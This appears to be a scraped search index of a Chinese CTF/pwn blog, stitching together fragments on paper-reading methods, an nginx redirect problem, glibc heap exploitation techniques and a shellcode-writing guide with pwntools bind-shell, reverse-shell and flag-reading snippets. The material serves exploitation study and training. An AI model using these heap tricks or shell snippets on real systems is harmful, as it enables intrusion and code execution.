总的来说，需要结合自己的阅读需求和阅读能力，抓住当下所需要的文章的重点，搞清楚该章节的具体内容，而忽略其他的章节内容。用马克思主义的观点来讲，即因地制宜，抓主要矛盾。 学习的时间有限，人的精力也有限，不可能保证每一篇文章下功夫精读。因此，要学会使用走马观花阅读法去尽可能多地阅读领域研究文章，把握自己研究领域的前沿发展方向。 事无巨细法\r事无巨细，法如其名。该方法属于精读文章的方法。总的来说，方法和下面说到李沐大神提到的三遍阅读法的第三遍差不多，但是我会描述得更详细一点。 我的精读论文笔记会记录这几个小标题： 研究背景 研究内容 研究亮点 实验设计 研究结论 研究展望 文章启示 文章不足 前面从背景到展望，主要基于论文的内容进行记录；后面的文章启示和文章不足则是你在阅读完文章之后，自己对文章的思考。对于启示来说，你除了关注作者提到的那些创新点外，还需要结合自己的研究方向和研究进度，思考这篇文章对于自己的研究启示。比如是否方法可以借鉴、是否试验方案可以改善、是否可以迁移论文思想等。而文章不足，则需要我们站在作者的角度，从全局和局部出发，思考如果是自己来写这篇文章，文章还有哪些改进点，整体的布局还有哪些地方需要调整。 从全局的角度，文章整体的布局还有哪些地方可以调整，哪个章节需要重点花笔墨，哪个章节可以删改。从局部的角度，如方法还需要介绍哪些方面，是否表达得更为清晰。每一幅图，每一张表，是不是可以设计得更加完美，表达信息更加准确等。子曰：学而不思则罔，思而不学则殆。在精读论文的时候，要做深度思考。倘若囿于作者的框架，则很难发掘出新的东西。 精读文章时，不要放过任何一个疑问。每一个问题都要打破沙锅问到底，搞清楚答案。读完一个小章后，需要回顾本章的主要内容，理清作者的叙述逻辑。 在关注文章的内容的时候，还需要关注文章的写作。比如，作者在 Introduction 是怎么布局的，每一个段落的作用是什么，每个段落中的每一个语句的作用是什么，这些都需要时刻关注。此外，对于一些比较好的表达和语句，需要摘抄下来，之后在写作时可以借鉴。 精读文章时，阅读的顺序并不重要，因为文章至少得读两遍，并且文章的每一句话都需要弄清楚其含义。除了文章的常规章节需要关注，文章的参考文献也需要做一些笔记。某些重要的参考文献应当被纳入你的阅读计划中。 事无巨细地精读文章，需要耗费大量的时间和精力。正所谓贪多嚼不烂，一般来说，一周内最多精读两篇文章。对于一些开创性的文章，则要花足够多的时间慢慢品读。因此，事无巨细法的核心是咬文嚼字，狠抓细节。 三遍阅读法\r来自于李沐大神分享1的读论文方法，我就不复述了。直接贴笔记2： 第一遍读：大概知道这篇文章在干什么，大概十几分钟，看下方法和实验的图和表，扫一眼，方法是不是适合自己。决定要不要读第二遍。 第二遍读：沿着标题一直往下读，不要太注意细节，一些公式证明之类，可以忽略，主要搞清楚重要的图和表知道他每一个字在干什么事情，比如，方法里整个流程图是什么样的，算法的图是什么样的，实验里 x 轴在干什么，y 轴在干什么。方法之间如何对比的，之间差距有多大，可能还没搞懂他在干什么。圈出重要相关文献，比如选用某文献的参数与方法。决定要不要再精读，可以读完引用的文献，再来读这篇。 第三遍读：需要知道每一句话在干什么，每一段在说什么，脑子里面重复实现这篇文章，提出什么问题，用什么方法解决这个问题。如果是我来做这件事，我应该用什么什么来实现这个东西，换自己来做实验，能不能做的比他的好。文献中有些地方没有往下走的，留到之后的结果了，如果我来做，我是不是能够往前走呢。 整个过程还是很合理的，总的来看，第一遍读的时候，是在初筛的基础上，再次筛选。本篇文章和自己的领域关系大不大，目前有没有时间读。或者说，读完整个文章，感觉没有价值，就可以停下来了。第二遍，则是给自己一个大概的感知，要不求甚解，这一步是在给第三遍打基础，有的时候，不精读的话，读到这一遍就可以了。第三遍，事无巨细，搞懂文章的每个问题，搞懂文章的每一句话。 总的来看，三遍阅读的方法，如果要完全走完，一篇文章还是需要花费不少的时间的，特别是第三遍，要一边读，一边思考。但是，如果遇到一篇很有价值的文章，还是值得花不少时间来精读的。 以上是李沐大神的阅读（精读）论文方法, 觉得有用的也可以参考这个方法读论文。 方法总结\r对上述内容小结如下： 明确自己的研究方向和目标：在开始阅读论文之前，要清楚自己的专业领域、研究方向以及未来的目标。这有助于缩小论文的范围，选择与自己研究相关的期刊和会议，并确定自己想要发表论文的目标期刊。 四看法：在初步筛选论文时，可以采用\"四看法\"，即看领域、看刊物、看作者、看引用。首先，看论文所属的领域，确定是否与自己的研究方向相关；然后，看论文发表的期刊或会议，了解其影响因子、排名等信息；接下来，看论文的作者，包括通讯作者和所属单位，这可以提供一些作者的背景信息和研究实力；最后，看论文的引用情况，了解其被引用的数量和被引用的文献。 走马观花法：这种阅读方法适用于快速了解论文内容的情况。可以粗略浏览论文的摘要、方法和实验结果，重点关注方法的创新点和实验结果的图表。通过这种方法，可以快速了解论文的主要内容和研究方向，把握领域的前沿发展方向。 事无巨细法：一种精读论文的方法，要求仔细阅读论文的各个章节，并记录重要信息和自己的思考。可以对论文的研究背景、研究内容、实验设计、结论等进行详细记录，同时思考论文对自己研究的启示和不足之处。在精读论文时，还要关注论文的内容和写作方式，包括章","date":"2023-07-01","objectID":"/zh-cn/2023-07-01-how-to-read-paper/:0:0","tags":["blog","skill","paper"],"title":"阅读论文的姿势总结","uri":"/zh-cn/2023-07-01-how-to-read-paper/"},{"categories":["pwn-trick"],"content":"pwn tutorial 1","date":"2023-05-06","objectID":"/zh-cn/2023-05-06-shg-pwn-tutorial-1/","tags":["blog","pwn","pwn tutorial","tutorial"],"title":"pwn 训练营第一期资料汇总","uri":"/zh-cn/2023-05-06-shg-pwn-tutorial-1/"},{"categories":["pwn-trick"],"content":" 分享队内第一期 pwn 训练营的资料。 前言\r为了提升队内师傅的 pwn 技巧，之前在内部举办了一次为期约两个月的 pwn 训练营。从结果来看，培训后师傅们的能力有着显著的提升，此次训练营取得了预期的效果。 本着开源与共享的互联网精神，我将此次训练营的相关材料分享出来并总结到本篇博客。如果你是一名 pwn 方向的小白或者你需要提升自己 pwn 方向的能力，欢迎观看我的培训视频，阅读有关讲义材料，并希望你能有所收获。 目前训练营开展了第一期，只进行了 5 个专题。我并不确定会不会继续开展训练营，也许等我将处理完手头的事情，会重新开始新的一期安全训练营，讲一些新的专题，分享一些有趣的知识~ 如果你在学习 pwn 的路上或者在使用 pwncli 的过程中遇到了一些问题和烦恼，欢迎来与我交流。你可以给我发邮件咨询，我的邮箱是 roderickchan@foxmail.com 。 培训材料\r本次培训所有的课程视频我都上传到了 Bilibili 和 Youtube，现汇总如下。 专题名称 内容简介 B 站链接 Youtube 链接 相关博客 材料下载 1-工具专题 介绍 pwn 常用的工具 点我观看 点我观看 暂无 点我下载 2-shellcode 专题 尽可能地介绍所有与 shellcode 有关的知识点 点我观看 点我观看 博客链接 点我下载 3-house of 专题 尽可能地总结目前所有的 house of 利用技巧 点我观看 点我观看 博客链接 点我下载 4-高版本堆利用专题 分析截止到目前的高版本堆利用技巧 点我观看 点我观看 博客链接 点我下载 5-赛题复现专题 复现 pwnhub 平台 2023-03 内部赛赛题 点我观看 点我观看 暂无 点我下载 Youtube 上已经把 5 个视频做成了播放列表， Bilili 也已经制作了合集。 结营大赛的赛题点我下载。结营大赛的赛题不提供 wp，如果需要解题思路的可以留言或与我联系。 写在最后\r感谢网安，让我学到了很多。作为一个网络安全业余爱好者，我在学习网安的过程中丰富了自己的知识面，提升了各项技能点，认识了许多厉害的师傅。 如果你在学习 pwn 的过程中遇到了一些搜索不到的问题，可以给我留言或者发邮件，主流的工具和技巧，我都知晓一点点。因为我自己独自学习的 pwn，能体会到入门时的艰辛和困难。学习过程中，倘若有过来人提点一下，便能省下许多时间和精力。 欢迎关注我的博客，订阅 RSS，我的博客会一直保持更新！之后可能会更新一些与安全领域关系不大的博客，因为我正在从事一些其他领域的研究工作。欢迎各位与我交流和探讨！ 最后，祝愿大家变得更强 💪 ","date":"2023-05-06","objectID":"/zh-cn/2023-05-06-shg-pwn-tutorial-1/:0:0","tags":["blog","pwn","pwn tutorial","tutorial"],"title":"pwn 训练营第一期资料汇总","uri":"/zh-cn/2023-05-06-shg-pwn-tutorial-1/"},{"categories":["questions"],"content":" 当域名没有规则匹配的时候，nginx的处理过程让我迷惑。 rt，当域名没有规则匹配的时候，nginx的处理过程让我感到迷惑。 问题复现\r问题描述\r事情是这样的。 好些天前，为了在公网服务器上搭建一个chatgpt的web版本服务，我申请了子域名chatgpt.roderickchan.cn，配置好了DNS解析规则并申请了对应的ssl证书。 我之前的nginx配置是这样的：/etc/nginx/nginx.conf为主要的配置文件，设置一些公共的参数、规则等，/etc/nginx/conf.d/*.conf*会存放不同的域名的规则。 我的/etc/nginx/nginx.conf内容如下： user www-data; worker_processes auto; pid /var/run/nginx.pid; worker_rlimit_nofile 1024; events { use epoll; worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; charset utf-8; autoindex off; sendfile on; tcp_nopush on; types_hash_max_size 2048; server_names_hash_max_size 1024; server_names_hash_bucket_size 512; client_header_buffer_size 16k; large_client_header_buffers 4 32k; map $http_upgrade $connection_upgrade { default upgrade; '' close; } log_format main '[$time_iso8601] $http_x_forwarded_for $remote_addr ' '$request_method $scheme://$host$request_uri $status ' '$http_user_agent'; access_log /var/log/nginx/access.log main; error_log /var/log/nginx/error.log; gzip off; include /etc/nginx/conf.d/*.conf; } 再正常不过的配置。 每当我申请了xxx.roderickchan.cn域名的时候，就会在/etc/nginx/conf.d目录下新增xxx.roderickchan.cn.conf文件，文件填入的内容如下： upstream xxxxx { ip_hash; server 127.0.0.1:12345; server 127.0.0.1:12346; server 127.0.0.1:12347; } server { listen 80; listen [::]:80; server_name xxxxx.roderickchan.cn; return 301 https://xxxxx.roderickchan.cn$request_uri; } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name xxxxx.roderickchan.cn; ssl_protocols TLSv1.2 TLSv1.3; ssl_prefer_server_ciphers on; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_session_tickets off; ssl_session_timeout 1d; ssl_session_cache shared:SSL:10m; add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always; ssl_certificate /home/xxxx.pem; ssl_certificate_key /home/xxxxx.key; location / { proxy_pass http://xxxxx; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto https; } } 该配置文件主要干了以下几件事： 配置了负载均衡策略 设置了http强制跳转https 设置了https的相关参数 服务搭建好后，使用了一段时间没啥问题。直到今天，我临时把服务取消了，并把文件xxx.roderickchan.cn.conf修改为了xxx.roderickchan.cn.conf.notuse，以为这样就访问不到子域名，也访问不到服务了。 然后，当我用浏览器访问http://xxx.roderickchan.cn的时候，发现被跳转到了https://yyy.roderickchan.cn（我的另一个子域名），并且提示了证书不匹配的错误。证书不匹配很好理解，因为https://yyy.roderickchan.cn提供的证书是为yyy.roderickchan.cn签发的，而我访问的是xxx.roderickchan.cn。 发现问题后，我一拍脑袋，直接让所有域名的http都跳转到https不就行了，这样访问https肯定会失败。 尝试解决\r于是，我立马对/etc/nginx/nginx.conf进行了修改，修改后的conf文件为： # ...... http { # .... server { listen 80; listen [::]:80; server_name _; return 301 https://$host/$request_uri; } include /etc/nginx/conf.d/*.conf; } 在80端口上，为所有没有匹配到的域名设置了强制跳转https。 我以为接下来访问http://xxx.roderickchan.cn的流程会像这样： 访问http://xxx.roderickchan.cn 重定向到https://xxx.roderickchan.cn 找不到http://xxx.roderickchan.cn的ssl证书 访问失败 用curl测试了一下，发现真的会失败： $ curl -L -v -i http://chatgpt.roderickchan.cn * Trying 120.25.122.195:80... * TCP_NODELAY set * Connected to chatgpt.roderickchan.cn (120.25.122.195) port 80 (#0) \u003e GET / HTTP/1.1 \u003e Host: chatgpt.roderickchan.cn \u003e User-Agent: curl/7.68.0 \u003e Accept: */* \u003e * Mark bundle as not supporting multiuse \u003c HTTP/1.1 301 Moved Permanently HTTP/1.1 301 Moved Permanently \u003c Server: nginx/1.18.0 (Ubuntu) Server: nginx/1.18.0 (Ubuntu) \u003c Date: Sat, 01 Apr 2023 09:12:30 GMT Date: Sat, 01 Apr 2023 09:12:30 GMT \u003c Content-Type: text/html Content-Type: text/html \u003c Content-Length: 178 Content-Length: 178 \u003c Connection: keep-alive Connection: keep-alive \u003c Location: https://chatgpt.roderickchan.cn/ Location: https://chatgpt.roderickchan.cn/ \u003c * Ignoring the response-body * Connection #0 to host chatgpt.roderickchan.cn left intact * Clear auth, redirects to port from 80 to 443Issue another request to this URL: 'https://chatgpt.roderickchan.cn/' * Trying 120.25.122.195:443... * TCP_NODELAY set * Connected to chatgpt.roderickchan.cn (120.25.122.195) port 443 (#1) * ALPN, offering h2 * ALPN, o","date":"2023-04-01","objectID":"/zh-cn/2023-04-01-nginx-config-problem/:0:0","tags":["blog","nginx"],"title":"nginx配置的问题记录","uri":"/zh-cn/2023-04-01-nginx-config-problem/"},{"categories":["pwn-trick"],"content":" 截止到目前，主要总结在2.35~2.37之间仍然残存的堆利用手法。注意，本文的撰写时间为2023-03-01。 1-攻击向量 1-1 tcachebin 1-1-1 绕过指针保护 1-1-2 劫持tcache_ptheread_struct 1-1-3 修改线程tcache变量 1-1-4 修改mp_结构体 1-2 fastbin 1-2-1 house of corrosion 1-2-2 tcache reverse into fastbin 1-3 smallbin 1-3-1 house of lore 1-3-2 tcache stash unlink attack 1-4 largebin 1-4-1 house of husk 1-4-2 libc/ld上的变量 1-5 IO_FILE 1-5-1 house of kiwi 1-5-2 house of emma 1-5-3 house of obstack 1-5-4 house of apple1/2/3 1-5-5 house of lyn/snake 1-6 _rtld_global 1-6-1 house of banana 1-6-2 利用link_map 1-7 libc.got 1-7-1 libc.got in IO 1-7-2 libc.got in malloc_printerr 1-8 heap_info/malloc_state 1-9 __environ 1-10 other 2-参考 可以在Bilibili上观看视频进行学习： 或者在Youtube上观看视频进行学习： 进入到glibc-2.31之后，很多原有的堆利用方法就失效，因此glibc给堆分配机制陆陆续续打上了很多patch，目前来看，与堆利用有关的patch有： tcachebin堆指针异或加密（glibc-2.32引入） tcahebin链的数量检查（glibc-2.33引入） fastbin堆指针异或加密（glibc-2.32引入） 堆内存对齐检查（glibc-2.32引入） 移除__malloc_hook和__free_hook（glibc-2.34引入） 引入tcache_key作为tcache的key检查（glibc-2.34引入） __malloc_assert 移除掉IO处理函数（glibc-2.36引入） 移除__malloc_assert函数（glibc-2.37引入） 将global_max_fast的数据类型修改为uint8_t（glibc-2.37引入） 根据目前已有的patch，结合之前已有的堆利用方法，总结2.35版本之后的攻击向量与攻击面，给出针对这些攻击面的攻击手段，并对某些攻击面的利用方法进行思考和拓展。如有错误或遗漏，欢迎批评指正。 本文所提到的house of系列的利用手段，可以参考我之前写的博客Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.cn)。 1-攻击向量\r1-1 Tcachebin\r事实上，在泄露地址的基础上劫持tcachebin的next，依然可以任意地址分配。 1-1-1 绕过指针保护\r绕过指针异或的保护方法主要有两种： 当tcachebin链表中只有一个chunk的时候，此时chunk-\u003enext \u003c\u003c 12即可得到堆地址。 当tcachebin链表的前两个chunk的地址相差不是很大的时候，可以用下面的公式计算： def calc_heap(addr): s = hex(addr)[2:] s = [int(x, base=16) for x in s] res = s.copy() for i in range(9): res[3+i] ^= res[i] res = \"\".join([hex(x)[2:] for x in res]) return int16_ex(res) 这里的addr就是头部chunk的加密后的next，只泄露一次就能还原出来。 1-1-2 劫持tcache_ptheread_struct\r这个结构体的重要性不言而喻，劫持了这个结构体可以控制tcachebin的分配。一般可以用tcachebin stash unlink或者largebin attack劫持。 1-1-3 修改线程tcache变量\r在tls区域，有一个线程变量tcache，如果能用largebin attack修改tcache变量，也可以控制tcache的分配。 1-1-4 修改mp_结构体\r关注与tcache有关的几个变量： struct malloc_par { //...... #if USE_TCACHE /* Maximum number of buckets to use. */ size_t tcache_bins; size_t tcache_max_bytes; /* Maximum number of chunks in each bucket. */ size_t tcache_count; /* Maximum number of chunks to remove from the unsorted list, which aren't used to prefill the cache. */ size_t tcache_unsorted_limit; #endif }; 修改掉tcache_bins可以把很大的chunk用tcachebin管理；修改掉tcache_count可以控制链表的chunk的数量。tcache_max_bytes目前没啥用，tcache_unsorted_limit可以影响unsortedbin链表的遍历过程。 1-2 Fastbin\r1-2-1 House of Corrosion\r使用的范围只能在2.35~2.37，进入到2.37之后，global_max_fast的类型被修改为int8_t，使用该技巧可以控制的地址范围大大缩小。 有关house of corrosion的技巧可以参考House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)。 1-2-2 Tcache Reverse Into Fastbin\r目前检查了对齐，所以要注意控制的地址要是0x?0结尾，否则报错。利用效果是任意地址写一个libc地址。 虽然0x?0写的是加密后的堆地址，但是0x?8会写上tcache_key，这也是可以利用的点。而且，在写上地址后，还能分配到该处。其利用过程如下： 分配13个fastbin范围内的chunk，假设大小为A 全部释放这13个chunk 分配7个，把tcachebin[A]耗尽 把fastbin最后一个chunk的fd修改为addr 调用一次malloc(A)即可触发tcache reverse into fastbin，可以分配到addr，也能给addr/addr+8处写上地址/数 1-3 Smallbin\r1-3-1 House of Lore\r很显然，house of lore依然可以使用，但是house of lore使用的时候，一方面是需要满足victim-\u003efd-\u003ebk == victim；另一方面，需要绕过下面讲的tcache stash unlink流程。除此之外，还需要注意内存对齐的问题。 1-3-2 Tcache Stash Unlink Attack\r在我之前的博客中，分析house of rust的时候总结过这个利用手法。 第一个技巧叫 tcachebin stash unlinking，下面称之为 TSU 技巧： tcachebin[A] 为空 smallbin[A] 有 8 个 修改第 8 个 smallbin chunk 的 bk 为 addr 分配 malloc(A) 的时候，addr+0x10 会被写一个 libc 地址 第二个技巧叫 tcachebin stash unlinking+，下面称之为 TSU+ 技巧： tcachebin[A] 为空 smallbin[A] 有 8 个 修改第 7 个 smallbin chunk 的 bk 为 addr，还要保证 addr+0x18 是一个合法可写的地址 分配 malloc(A) 的时候，addr 会被链入到 tcachebin，也就是可以分配到 addr 处 可以看到，和fastbin reverse into tcache的攻击方法很类似，但是得到的效果不一样。TSU可以在任意地址写libc地址，而TSU+除了可以写libc地址，还能再任意地址分配。 1-4 Largebin\r目前能用的largebin attack只能使用下面这个分支： /* maintain large bins in sorted order */ if (fwd != bck) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-\u003ebk)); if ((unsigned long) (size) \u003c (unsigned long) chunksize_nomask (bck-\u003ebk)) { fwd = bck; bck = bck-\u003ebk; victim-\u003ef","date":"2023-03-01","objectID":"/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/:0:0","tags":["pwn","glibc","heap exploitation"],"title":"Glibc高版本堆利用方法总结","uri":"/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/"},{"categories":["pwn-trick"],"content":"尽可能地总结目前的house of利用手段","date":"2023-02-27","objectID":"/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/","tags":["heap exploitation","house of","glibc"],"title":"Glibc堆利用之house of系列总结","uri":"/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/"},{"categories":["pwn-trick"],"content":" 总结一下glibc堆利用的house of系列利用手法，主要参考了how2heap，同时参考了其他优秀的文章。 文章很长，听首音乐放松一下吧~ 1-前言 2-house of系列 2.1-house of spirit 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.2-house of einherjar 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.3-house of force 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.4-house of lore 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.5-house of orange 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.6-house of rabbit 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.7-house of roman 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.8-house of storm 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.9-house of corrosion 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.10-house of husk 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.11-house of atum 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.12-house of kauri 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.13-house of fun 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.14-house of mind 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.15-house of muney 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.16-house of botcake 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.17-house of rust 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.18-house of crust 漏洞成因 适用范围 利用原理 相关技巧 2.19-house of io 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.20-house of banana 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.21-house of kiwi 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.22-house of emma 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.23-house of pig 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.24-house of obstack 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.25-house of apple1 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.26-house of apple2 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.27-house of apple3 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.28-house of gods 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.29-house of lys 漏洞成因 适用范围 利用原理 相关技巧 利用效果 2.30-house of snake 3-总结 4-参考 可以在Bilibili上观看视频进行学习： 或者在Youtube上观看视频进行学习： 1-前言\rGlibc的house of系列攻击手法基于都是围绕着堆利用和IO FILE利用。还有很多堆利用手法也非常经典，但是由于其没有被冠以house of xxxx，故没有收录到本文中。如果想学习所有的详细的堆攻击手法，强烈建议follow仓库how2heap进行学习。我相信，只要把how2heap里面的每一个堆利用手法都学懂学透了，glibc堆利用你将尽在掌握。 在开始系列总结之前，我会给出一个表格，表格里面分别是house of xxxx和对应的优秀的解析文章，在此非常感谢各位师傅们的总结。如果你在阅读本文的过程中想完整地查看某一个手法地详细利用过程，那么可以直接回到表格，点击对应的链接进行学习。目前的最新版本为2.37，但是，目前的ubuntu:23.04还没开始用glibc-2.37，使用的仍然是glibc-2.36。 如果还有哪些house of xxxx的利用手法没有收录进来，或你对本文存有一些疑问，或者你发现本文某些内容编写错误，还请留言指正。 需要注意的是，除了关注各种house of利用技巧本身，更重要的是，需要关注该利用技巧背后的思想和原理。如果你能从这一系列的利用手法中提炼出一些通用的攻击向量或者攻击思想，日后在面对其他的场景，你也能更快的找到系统的漏洞点并加以利用。学习glibc堆利用更多的是为了举一反三，为了更好地掌握漏洞挖掘模式、漏洞分析方法，而不仅仅是为了比赛。 house of系列的表格如下，适用版本不考虑低于glibc-2.23的版本。我将在下文中进一步阐述每一个利用手法的原理、使用场景与适用范围。 攻击方法 影响范围 学习链接 house of spirit 2.23——至今 堆利用系列之house of spirit-安全客 - 安全资讯平台 (anquanke.com) house of einherjar 2.23——至今 PWN——House Of Einherjar CTF Wiki例题详解-安全客 - 安全资讯平台 (anquanke.com) house of force 2.23——2.29 Top chunk劫持：House of force攻击-安全客 - 安全资讯平台 (anquanke.com) house of lore 2.23——至今 House of Lore - CTF Wiki (ctf-wiki.org) house of orange 2.23——2.26 House of orange-安全客 - 安全资讯平台 (anquanke.com) house of rabbit 2.23——2.28 http://p4nda.top/2018/04/18/house-of-rabbit/ house of roman 2.23——2.29 House of Roman - CTF Wiki (ctf-wiki.org) house of storm 2.23——2.29 House of storm 原理及利用-安全客 - 安全资讯平台 (anquanke.com) house of corrosion 2.23——至今 House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com) house of husk 2.23——至今 house-of-husk学习笔记-安全客 - 安全资讯平台 (anquanke.com) house of atum 2.26——2.30 https://abf1ag.github.io/2021/06/11/house-of-atum/ house of kauri 2.26——2.32 Overview of GLIBC heap exploitation techniques (0x434b.dev) house of fun 2.23——2.30 Overview of GLIBC heap exploitation techniques (0x434b.dev) house of mind 2.23——至今 how2heap/house_of_mind_fastbin.c at master · shellphish/how2heap (github.com) house of muney 2.23——至今 House of Muney 分析-安全客 - 安全资讯平台 (anquanke.com) house of botcake 2.23——至今 奇安信攻防社区-深入理解 House of Botcake 堆利用手法 (butian.net) house of rust 2.26——至今 c4ebt/House-of-Rust house of crust 2.26——2.37 c4ebt/House-of-Rust house of io 2.26——至今 Overview of GLIBC heap exploitation techniques (0x434b.dev) house of banana 2.23——至今 house of banana-安全客 - 安全资讯平台 (anquanke.com) house of kiwi 2.23——2.36 House OF Kiwi-安全客 - 安全资讯平台 (anquanke.com) house of emma 2.23——至今 house of emma house of pig 2.23——至今 house of pig一个新的堆利用详解-安全客 - 安全资讯平台 (anquanke.com) house of obstack 2.23——至今 一条新的glibc IO_FILE利用链：_IO_obstack_jumps利用分析 - 跳跳糖 (tttang.com) house of apple1 2.23——至今 House of Apple 一种新的glibc中IO攻击方法 (1) - roderick - record and learn! (roderickchan.cn","date":"2023-02-27","objectID":"/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/:0:0","tags":["heap exploitation","house of","glibc"],"title":"Glibc堆利用之house of系列总结","uri":"/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/"},{"categories":["pwn-trick"],"content":" 对shellcode知识点的一些总结。 relax and learn… 1-如何编写shellcode 1-1 纯手搓 1-1-1 纯汇编 1-1-2 内联汇编 1-1-3 使用tiny_libc 1-2 借助工具 1-2-1 pwntools的shellcraft 1-2-2 alpha3 1-2-3 AE64 1-2-4 shellcode encoder 1-2-5 msf生成 1-3 在线网站 2-突破沙箱规则 2-1 使用at/v/2系统调用 2-2 使用orw读取flag 2-3 切换指令模式 2-4 使用0x40000000+X系统调用 2-5 使用 io_uring 系统调用 3-字符型shellcode 3-1 可打印字符 3-2 字母和数字 3-3 限制字母和数字 4-shellcode编写技巧 4-1 观察寄存器状态 4-2 观察栈的状态 4-3 使用更短的指令 4-4 构造read再次读入 4-5 侧信道爆破内存 4-6 侧信道爆破flag 4-7 借助rax寄存器 4-8 借助段寄存器 4-9 ptrace注入 4-10 多架构通用shellcode 4-11 有限字符的shellcode 4-12 寄存器全为0的syscall 参考 本文尽可能地全面地总结有关shellcode的知识点。目前重点关注linux系统用户态的x86汇编指令。持续更新中…… 本文只将现有有关shellcode的知识点提炼出来，没有做细致地解释与分析，不会涉及到具体的例题。若师傅们有疑问可以在评论中提出…… 可以在Bilibili上观看视频进行学习： 或者在Youtube上观看视频进行学习： 1-如何编写shellcode\rshellcode是一段可被CPU直接执行的程序码。 使用shellcode进行攻击是一项经典而强大的技术，借助shellcode几乎可以完成任何事情，包括但不限于泄露敏感信息、反弹shell、布置后门等。 编写shellcode的方式有很多，而方式的选择取决于实际场景。如当需要编写复杂的shellcode的时候，需要手搓；当需要注入特定模板的shellcode时，可以采用工具生成；当需要观察shellcode的字符、长度时，可以采用在线网站生成。 1-1 纯手搓\r学到最后，你会发现还是会回归到最原始的方式：手搓shellcode。 1-1-1 纯汇编\r如果使用gcc编译，模板如下： ;#gcc -c start.s -o start.o ;#ld -e _start -z noexecstack start.o -o start ;// 使用intel语法 .intel_syntax noprefix .text .globl _start .type _start, @function _start: ;// SYS_exit mov rdi, 0 mov rax, 60 syscall 也可以使用nasm，只是编译的命令不一样。 1-1-2 内联汇编\r有时候需要调用一下库函数，可以使用内联汇编Extended Asm (Using the GNU Compiler Collection (GCC))，直接在程序中使用asm(...);编写内联汇编语句。 但是在剥离shellcode的时候，需要将call xxxxxxxx的偏移进行修正。 1-1-3 使用tiny_libc\r为了快速、高效、准确地编写出复杂的shellcode，我参考了musl库实现了一个简单的libc库，姑且称之为tiny_libc，项目地址在CVE-ANALYZE/tiny_libc at main · RoderickChan/CVE-ANALYZE (github.com)。 实现了一些基本的系统调用函数、字符串操作函数，glibc常用函数，比如：system、popen、sleep、strcpy、memcpy、puts等等。编译时不依赖任何其他库文件，编译后text段的大小基本不会超过1 page。 在main.c中编写程序逻辑。如果需要剥离出shellcode，执行get_shellcode.py文件即可在当前目录生成shellcode文件，然后读取该文件，直接输入给目标程序即可。 这个库当初是为了研究dirty pipe漏洞开发的，因为该漏洞不能写超过一页的shellcode。因此，需要编写复杂的shellcode，又不想写汇编的时候，可以用这个库直接写C，然后一键得到要注入的shellcode。 如在main.c写入如下内容： #include \"all_in_one.h\" //---------------------------------------------------- void _start() { system(\"date\"); puts(popen_r(\"cat /etc/issue\")); exit(0); } 执行后输出为： $ ./main Wed Feb 19 21:19:43 CST 2023 Ubuntu 20.04.4 LTS \\n \\l $ ldd main not a dynamic executable 可以很方便的剥离shellcode。 1-2 借助工具\r1-2-1 Pwntools的shellcraft\rpwntools的shellcraft定义了非常多的模板，支持的架构有x86/x64/arm/arm64等等。 点击pwnlib.shellcraft — Shellcode generation — pwntools 4.10.0dev documentation进行学习。 使用的示例如下： shellcode = asm(pwnlib.shellcraft.amd64.linux.bindsh(9999, 'ipv4')) # 绑定shell到999端口 shellcode = asm(pwnlib.shellcraft.amd64.linux.cat(\"/flag\", 1)) # 读取/flag，输出到标准输出 shellcode = asm(pwnlib.shellcraft.amd64.linux.cat2(\"/flag\", 1, 0x30)) # 读取/flag，输出到标准输出 shellcode = asm(pwnlib.shellcraft.amd64.linux.socket(\"ipv4\", \"tcp\")+\\ pwnlib.shellcraft.amd64.linux.connect(\"127.0.0.1\", 9999, 'ipv4')+\\ pwnlib.shellcraft.amd64.linux.dupsh('rax') ) # 反弹shell 1-2-2 Alpha3\r建议使用TaQini/alpha3: Automatically exported from code.google.com/p/alpha3 (github.com)这个版本。 使用需要指定基址寄存器： python ./ALPHA3.py x64 ascii mixedcase rax --input=\"shellcode\" ./shellcode_x64.sh rax 